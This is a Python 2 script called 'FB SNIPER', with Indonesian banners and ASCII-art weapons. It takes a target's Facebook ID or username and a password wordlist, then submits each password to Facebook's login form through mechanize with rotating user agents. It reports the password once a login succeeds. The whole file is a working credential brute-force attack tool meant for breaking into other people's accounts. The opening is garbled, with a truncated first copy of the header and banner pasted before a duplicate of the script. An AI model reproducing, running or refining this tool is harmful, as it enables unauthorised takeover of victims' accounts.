#!usr
# -*- coding: UTF-8 -*-
# Mod by: MR.ZRIL
# team: life of programmer


import os
import sys
import time
import random
import cookielib
import mechanize

wd = "\033[90;1m" # dark
GL = "\033[96;1m" # Blue aqua
BB = "\033[34;1m" # Blue light
YY = "\033[33;1m" # Yellow light
GG = "\033[32;1m" # Green light
WW = "\033[0;1m"  # White light
RR = "\033[31;1m" # Red light
CC = "\033[36;1m" # Cyan light
B = "\033[34m"    # Blue
Y = "\033[33;1m"    # Yellow
G = "\033[32m"    # Green
W = "\033[0;1m"     # White
R = "\033[31m"    # Red
C = "\033[36;1m"    # Cyan

def runntxt(s):
        for noobs in s + '\n':
                sys.stdout.write(noobs)
                sys.stdout.flush()
                time.sleep(10. / 2100)


def banner():
    os.system('clear')
    print " "
#!usr
#!usr
# -*- coding: UTF-8 -*-
# autor: King-N.Z
# T24M :1MP3R10R
# FREND:MR.Tiger-zona-cyber

import os
import sys
import time
import random
import cookielib
import mechanize

wd = "\033[90;1m" # dark
GL = "\033[96;1m" # Blue aqua
BB = "\033[34;1m" # Blue light
YY = "\033[33;1m" # Yellow light
GG = "\033[32;1m" # Green light
WW = "\033[0;1m"  # White light
RR = "\033[31;1m" # Red light
CC = "\033[36;1m" # Cyan light
B = "\033[34m"    # Blue
Y = "\033[33;1m"    # Yellow
G = "\033[32m"    # Green
W = "\033[0;1m"     # White
R = "\033[31m"    # Red
C = "\033[36;1m"    # Cyan

def runntxt(s):
        for noobs in s + '\n':
                sys.stdout.write(noobs)
                sys.stdout.flush()
                time.sleep(10. / 2100)


def banner():
    runntxt(GG+" (¯`·.¸¸.·´¯`·.¸¸.-¯`·.¸¸.·´¯`·.¸¸.·.¸¸.·´¯`·.¸¸.-> ")
    runntxt(GG+"                 __________________   ")
    runntxt(GL+"               ®  assalamu'@l@ikum  ®.            ")
    runntxt(GG+" [________________________________________________] ")
    runntxt(GG+"   JANGAN MENGAKUI DIRI ANDA ADALAH SEORANG HACKER  ")
    runntxt(GG+"      KARENA SEORANG HACKER TIDAK INGIN DI AKUI      ")
    runntxt(GG+"                  APALAGI MENGAKUI ")
    runntxt(WW+"          	       Goblin ")
    runntxt(WW+"                      King-N.Z ")
    runntxt(GL+"   (¯`·.¸·´¯>.admin penuh dengan dosa`·.¸¸.-> ")
    time.sleep(1.5)
    print GG+"(¯`·.¸¸.·´¯`·.¸¸.-¯`·.¸¸.·´¯`·.¸¸.·.¸¸.·´¯`·.¸¸.->"
    print GG+"                      ___________           "
    print GL+"       I{•------»     <FB SNIPER>     »------•{I| "
    print GL+".                SIAP MEMAKAIN SENJATA "
banner()

print wd+"         Bidik dengan bener "
print RR+"╭────\033[91m[\033[96m Masukkan ID\033[95m / \033[96mUsername Target\033[91m ] "
email_target = str(raw_input(GL+"\033[92m╰────➲\033[93m  "))
print " "
print "\033[92m╭────\033[91m[ \033[96mMasukan ammo nya \033[95m( ammo.txt ) \033[91;1m]"
password_list = str(raw_input(GG+"╰────➲\033[93m "))
login = 'https://www.facebook.com/login.php?login_attempt=1'
useragents = [('Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0','Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Geck')]
# useragents = [('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36','Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36','Mozilla/5.0 (Windows NT 5.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36','Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36','Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36','Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36','Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36','Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36',)]

def pil():
                print GG+" "
                g = str(raw_input("[?] PAKAI SENJATA LAGI..\033[93;1m[y/n]: "))
                if g == 'y' or g == 'Y':
                    os.system('python2 brute.py')
                elif g == 'n' or g == 'N':
                    print wd+"Keluar dari program..."
                    sys.exit()
                else:
                    print RR+"Pilih yang bener cuk..."
                    pil()

def edit_wordlist():

        print GG+" "
        ed = str(raw_input("[?] Edit AMMO cuk.? \033[96;1m[y/n]: "))
        if ed == 'y' or ed == 'Y':
                os.system('nano '+password_list)
                pil()
        elif ed == 'n' or ed == 'N':
                print wd+"MEMBUANG SENJATA..."
                sys.exit()

        else:
                print RR+"Pilih yg bener cuk..."
                edit_wordlist()

def main():
        global noobs
        noobs = mechanize.Browser()
        cj = cookielib.LWPCookieJar()
        noobs.set_handle_robots(False)
        noobs.set_handle_redirect(True)
        noobs.set_cookiejar(cj)
        noobs.set_handle_equiv(True)
        noobs.set_handle_referer(True)
        noobs.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
        runn_noobs()
        life()
        print " "
        print RR+" UPPSSS target meleset.."
        print " "
def iqbalz(iqbalz_password):
  try:
 	sys.stdout.write(GG+"\n[\033[91m+\033[92m]\033[91;1m [\033[97m"+email_target+"\033[91m]\033[90m Mencoba ==> \033[91m[\033[90;1m"+iqbalz_password)
	sys.stdout.flush()
	noobs.addheaders = [('User-agent', random.choice(useragents))]
	site = noobs.open(login)
	noobs.select_form(nr = 0)
	noobs.form['email'] = email_target
	noobs.form['pass'] = iqbalz_password
	tom = noobs.submit()
	mask = tom.geturl()
	if mask != login and (not 'login_attempt' in mask):
                        print " "
			print ("\033[96m                S U C C E S S")
			print "          P A S S W O R D  F I N D "
                  	print RR+"+-------------------------------------------+"
	         	print (RR+"#\033[97m ID / Email Target:\033[92m {}").format(email_target)
        	        print (RR+"#\033[97m Password Target:\033[92m {}").format(iqbalz_password)
        	        print " "
        	        raw_input(WW+"TEKAN ENTER UNTUK MEMBUANG SENJATA..")
			sys.exit(1)
  
  
  except KeyboardInterrupt:
      print wd+"Stop......."
      edit_wordlist()
      sys.exit()    	    
def life():
	global iqbalz_password
	password_nob = open(password_list, "r")
	for iqbalz_password in password_nob:
		password_nob = iqbalz_password.replace("\n","")
		iqbalz(iqbalz_password)		

def runn_noobs():
         global password_list

         lop = CC+"""
   _\____________________,,__
  / `–\033[90;1m│││││││││\033[31;1m————————————-\033[36;1m_]\033[90;1m┈\033[31;1m>\033[90;1m┈\033[31;1m>\033[90;1m┈\033[31;1m>\033[90;1m┈\033[31;1m>\033[90;1m┈\033[31;1m>\033[31;1m╳\033[90;1m,'
 \033[36;1m/_==o ____________________)
...),—.(_(__) ../\033[31;1m>┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈X
\033[36;1m...// (\) ),——..
..//___//..
./`—-’ /..
/____ /..       Gw mo nembak loe...

•*´¨`*•.¸¸.•*´¨`*•.¸¸.•*´¨`*•.¸¸.•*´¨`*•.¸¸.•
::: (\_(\ …*…*…*…*…*…*…*…*…*…*…*…*
*: (=’ :’) ::::::::  NUR SYAH  :::::::::::
•.. (,(”)(”)¤…*…*…*…*…*…*…*…*…*…*…*
¸.•*´¨`*•.¸¸.•*´¨`*•.¸¸.•*´¨`*•.¸¸.•*´¨`*•.¸

\033[91;1m
                \033[90;1mLife Of Programmer\033[91;1m
             Powered by:\033[97m MR.NZ
      """


         print lop
         nuub = open(password_list, 'r')
         nuub = nuub.readlines()
         print wd+" [#] ID / Username Target\033[97;1m: {}".format(email_target)
         print wd+" [#] JUmlah Password saat ini\033[97;1m:", len(nuub),'password'
         print wd+" [#] Tunggu Proses Cracking\033[97;1m.........."
         print " "

if __name__=='__main__':
	main()	
